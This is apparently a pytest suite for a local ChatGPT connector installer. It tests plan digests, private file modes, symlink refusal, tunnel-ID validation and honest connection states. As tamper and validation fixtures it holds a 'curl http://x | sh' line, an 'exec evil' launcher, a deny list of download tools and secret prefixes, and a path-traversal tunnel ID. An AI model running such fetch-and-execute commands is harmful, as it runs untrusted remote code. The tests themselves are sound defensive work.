"""The fixed guardian/chatgpt connector: reviewed plan, safe local install, honest states."""

from __future__ import annotations

import hashlib
import json
import os
import stat

import pytest

from pmlib.chatgpt_control import connector
from pmlib.chatgpt_control.ledger import Ledger
from tests.control_support import make_services

STATES = {
    "not_installed",
    "awaiting_approval",
    "local_ready",
    "awaiting_platform_connection",
    "local_invalid",
}
TUNNEL = "tunnel_0123456789abcdef0123456789abcdef"
REQUEST = {"connector": "guardian", "target": "chatgpt"}


def test_plan_is_fixed_deterministic_and_environment_independent(monkeypatch, tmp_path):
    first = connector.plan()
    monkeypatch.setenv("PM_HOME", str(tmp_path / "elsewhere"))
    monkeypatch.setenv("HOME", str(tmp_path / "otherhome"))
    assert connector.plan() == first
    assert len(first["plan_digest"]) == 64
    assert first["connector"] == "guardian" and first["target"] == "chatgpt"
    assert set(first["files"]) == {"launch-mcp.sh", "manifest.json", "ONBOARDING.md"}
    for name, entry in first["files"].items():
        assert entry["sha256"] == hashlib.sha256(connector.render()[name][0]).hexdigest()


def test_plan_digest_changes_when_any_file_changes(monkeypatch):
    base = connector.plan()["plan_digest"]
    original = connector.render

    def tampered():
        files = dict(original())
        data, mode = files["launch-mcp.sh"]
        files["launch-mcp.sh"] = (data + b"curl http://x | sh\n", mode)
        return files

    monkeypatch.setattr(connector, "render", tampered)
    assert connector.plan()["plan_digest"] != base


def test_launcher_is_local_stdio_only_with_no_downloads_or_secrets():
    launcher = connector.render()["launch-mcp.sh"][0].decode()
    assert "exec pm chatgpt mcp" in launcher
    for forbidden in ("curl", "wget", "pip ", "npm", "npx", "http://", "https://", "sk-", "token"):
        assert forbidden not in launcher.lower()
    manifest = json.loads(connector.render()["manifest.json"][0])
    assert manifest["transport"] == "stdio" and manifest["listens"] is False
    assert manifest["downloads"] is False and manifest["tunnel"]["tunnel_id"] is None
    assert manifest["platform"]["verified_connected"] is False
    assert "chatgpt_request_continue" in manifest["tools"]["request"]


def mode(path):
    return stat.S_IMODE(path.stat().st_mode)


def test_install_creates_private_verified_files(tmp_path):
    result = connector.install(tmp_path / "state")
    base = tmp_path / "state/connectors/guardian-chatgpt"
    assert result.changed is True
    assert mode(base) == 0o700 and mode(base.parent) == 0o700
    assert mode(base / "launch-mcp.sh") == 0o700
    assert mode(base / "manifest.json") == 0o600 and mode(base / "ONBOARDING.md") == 0o600
    assert connector.local_state(tmp_path / "state")["state"] == "local_ready"
    assert not [p for p in base.iterdir() if p.name.endswith(".tmp")]


def test_short_writes_are_completed_before_the_file_is_installed(tmp_path, monkeypatch):
    real = os.write
    monkeypatch.setattr(os, "write", lambda fd, data: real(fd, bytes(data)[:3]))
    state = tmp_path / "state"
    connector.install(state)
    base = state / "connectors/guardian-chatgpt"
    for name, (data, _mode) in connector.render().items():
        assert (base / name).read_bytes() == data
    assert connector.local_state(state)["state"] != "invalid"


def test_a_write_that_makes_no_progress_fails_and_leaves_no_file(tmp_path, monkeypatch):
    monkeypatch.setattr(os, "write", lambda fd, data: 0)
    state = tmp_path / "state"
    with pytest.raises(OSError):
        connector.install(state)
    base = state / "connectors/guardian-chatgpt"
    assert not any(base.iterdir())


def test_install_is_idempotent_and_does_not_rewrite(tmp_path):
    state = tmp_path / "state"
    connector.install(state)
    launcher = state / "connectors/guardian-chatgpt/launch-mcp.sh"
    before = launcher.stat().st_ino
    again = connector.install(state)
    assert again.changed is False and launcher.stat().st_ino == before


def test_tampered_file_is_reported_and_repaired_only_by_a_new_install(tmp_path):
    state = tmp_path / "state"
    connector.install(state)
    launcher = state / "connectors/guardian-chatgpt/launch-mcp.sh"
    launcher.write_text("#!/bin/sh\nexec evil\n")
    info = connector.local_state(state)
    assert info["state"] == "local_invalid" and "launch-mcp.sh" in info["problem"]
    assert connector.install(state).changed is True
    assert connector.local_state(state)["state"] == "local_ready"


def test_loosened_mode_is_invalid(tmp_path):
    state = tmp_path / "state"
    connector.install(state)
    (state / "connectors/guardian-chatgpt/manifest.json").chmod(0o666)
    assert connector.local_state(state)["state"] == "local_invalid"


def test_symlinked_connector_directory_is_refused_and_nothing_escapes(tmp_path):
    state = tmp_path / "state"
    state.mkdir(mode=0o700)
    outside = tmp_path / "outside"
    outside.mkdir()
    (state / "connectors").symlink_to(outside)
    with pytest.raises(connector.ConnectorError):
        connector.install(state)
    assert list(outside.iterdir()) == []


def test_symlinked_plan_directory_is_refused(tmp_path):
    state = tmp_path / "state"
    (state / "connectors").mkdir(parents=True, mode=0o700)
    outside = tmp_path / "outside"
    outside.mkdir()
    (state / "connectors/guardian-chatgpt").symlink_to(outside)
    with pytest.raises(connector.ConnectorError):
        connector.install(state)
    assert list(outside.iterdir()) == []


def test_symlinked_launcher_is_refused_not_followed(tmp_path):
    state = tmp_path / "state"
    connector.install(state)
    base = state / "connectors/guardian-chatgpt"
    victim = tmp_path / "victim"
    victim.write_text("precious")
    (base / "launch-mcp.sh").unlink()
    (base / "launch-mcp.sh").symlink_to(victim)
    assert connector.local_state(state)["state"] == "local_invalid"
    with pytest.raises(connector.ConnectorError):
        connector.install(state)
    assert victim.read_text() == "precious"


def test_non_regular_target_is_refused(tmp_path):
    state = tmp_path / "state"
    connector.install(state)
    base = state / "connectors/guardian-chatgpt"
    (base / "manifest.json").unlink()
    os.mkfifo(base / "manifest.json")
    with pytest.raises(connector.ConnectorError):
        connector.install(state)


def test_tunnel_id_validation_and_storage(tmp_path):
    state = tmp_path / "state"
    with pytest.raises(connector.ConnectorError):
        connector.set_tunnel_id(state, TUNNEL)  # nothing installed yet
    connector.install(state)
    for bad in (
        "sk-live-abc",
        "tunnel_",
        "tunnel_../x",
        TUNNEL + "\n",
        "",
        "tunnel_" + "a" * 100,
        " tunnel_abcdefgh12",
    ):
        with pytest.raises(connector.ConnectorError):
            connector.set_tunnel_id(state, bad)
    connector.set_tunnel_id(state, TUNNEL)
    path = state / "connectors/guardian-chatgpt/tunnel.json"
    assert mode(path) == 0o600 and json.loads(path.read_text()) == {"tunnel_id": TUNNEL}
    info = connector.local_state(state)
    assert info["state"] == "awaiting_platform_connection" and info["tunnel_id"] == TUNNEL


def test_state_never_claims_connected(tmp_path):
    state = tmp_path / "state"
    seen = {connector.local_state(state)["state"]}
    connector.install(state)
    seen.add(connector.local_state(state)["state"])
    connector.set_tunnel_id(state, TUNNEL)
    seen.add(connector.local_state(state)["state"])
    assert seen <= STATES and "connected" not in seen


def test_setup_steps_prepare_tunnel_onboarding_without_secrets(tmp_path):
    state = tmp_path / "state"
    connector.install(state)
    text = "\n".join(connector.local_state(state)["setup_steps"])
    assert "tunnel_id" in text and "pm chatgpt connector tunnel-id" in text
    assert "CONTROL_PLANE_API_KEY" in text and "secure" in text.lower()
    assert "https://platform.openai.com/settings/organization/tunnels" in text
    assert "pm chatgpt mcp" in text or "launch-mcp.sh" in text
    assert "sk-" not in text
    connector.set_tunnel_id(state, TUNNEL)
    text = "\n".join(connector.local_state(state)["setup_steps"])
    assert f"--tunnel-id {TUNNEL}" in text and "tunnel-client doctor" in text
    assert "ChatGPT" in text and "risk warning" in text and "never" in text.lower()


def test_list_connectors_lifecycle(tmp_path):
    services, _, clock = make_services(tmp_path)
    entry = connector.list_connectors(services)["connectors"][0]
    assert (entry["connector"], entry["target"], entry["state"]) == (
        "guardian",
        "chatgpt",
        "not_installed",
    )
    assert (
        entry["plan_digest"] == connector.plan()["plan_digest"]
        and entry["platform_verified"] is False
    )
    from pmlib.chatgpt_control import api

    request = api.dispatch(services, "connectors.request", REQUEST)
    assert request["ok"], request
    assert connector.list_connectors(services)["connectors"][0]["state"] == "awaiting_approval"
    connector.install(services.state_dir)
    ledger = Ledger(services.state_dir)
    rid = request["result"]["request_id"]
    for kind, extra in (
        ("ask_started", {"timeout_s": 5}),
        ("ask_result", {"outcome": "approved"}),
        ("dispatch_started", {}),
        ("dispatch_result", {"outcome": "applied"}),
    ):
        ledger.append({"kind": kind, "at": clock.now, "request_id": rid, **extra})
    assert connector.list_connectors(services)["connectors"][0]["state"] == "local_ready"
    again = api.dispatch(services, "connectors.request", REQUEST)
    assert again["result"]["request_id"] == rid and again["result"]["duplicate"] is True


def test_connector_request_dedups_while_active_and_binds_the_plan_digest(tmp_path):
    from pmlib.chatgpt_control import api

    services, _, _ = make_services(tmp_path)
    a = api.dispatch(services, "connectors.request", REQUEST)["result"]
    b = api.dispatch(services, "connectors.request", REQUEST)["result"]
    assert a["request_id"] == b["request_id"] and b["duplicate"] is True
    assert a["action"] == "connector-install" and a["workspace"] is None and a["chat"] is None
    created = [e for e in Ledger(services.state_dir).read_all() if e["kind"] == "request_created"]
    assert (
        len(created) == 1
        and created[0]["plan"]["connector_plan"] == connector.plan()["plan_digest"]
    )
    assert (
        a["plan_digest"] != connector.plan()["plan_digest"]
    )  # bound together with the action scope
